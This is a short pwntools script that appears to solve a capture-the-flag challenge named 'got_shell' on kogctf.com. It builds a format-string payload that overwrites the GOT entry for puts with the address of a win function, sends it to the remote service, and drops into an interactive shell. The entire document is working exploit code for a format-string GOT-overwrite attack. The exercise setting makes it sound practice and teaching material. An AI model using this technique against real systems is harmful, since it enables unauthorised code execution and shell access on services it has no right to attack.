from pwn import *

HOST = "kogctf.com"
PORT = 20917

elf = ELF("./got_shell")
got_puts = elf.got[b"puts"]
sym_win = elf.symbols[b"win"]

payload = fmtstr_payload(11, {got_puts: sym_win})

r = remote(HOST, PORT)
r.recvuntil(b"Why you wanna shell? ")
r.sendline(payload)

r.interactive()